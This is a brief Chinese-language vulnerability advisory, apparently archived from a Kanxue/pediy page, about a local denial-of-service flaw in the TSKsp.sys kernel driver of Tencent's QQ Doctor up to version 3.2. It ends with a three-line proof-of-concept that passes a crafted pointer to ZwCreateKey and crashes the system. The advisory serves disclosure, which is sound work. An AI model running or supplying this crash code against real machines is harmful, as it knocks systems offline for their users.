
# QQ 医生 <= 3.2 内核驱动程序 ZwCreateKey HOOK 本地拒绝服务漏洞

> 原文：[`www.pediy.com/kssd/pediy11/107384.html`](https://www.pediy.com/kssd/pediy11/107384.html)

## 影响版本

QQ 医生 `<=` 3.2

## 发布时间

2010-02-19

## 漏洞描述

QQ 医生是腾讯公司开发的一个安全辅助工具，其用于实现注册表拦截等功能的驱动程序 `TSKsp.sys` 没有对 `ZwCreateKey` 的参数做完整的检查就直接传递给 `ZwOpenKey`，此时位于内核模式系统会直接使用参数中的内容，不作任何检查，因此攻击者可构造特殊的参数，使系统蓝屏

## 利用代码

```
InitializeObjectAttributes(&ObjectAttributes , &name , 0 , 0 , 0 );
ObjectAttributes.SecurityQualityOfService = (PVOID)0x80000000;
ZwCreateKey(&KeyHandle , 0 , &ObjectAttributes , 0 , 0 , 0 , 0 );
```

安装了 QQ 医生的机器上运行上面三行代码，系统即告蓝屏
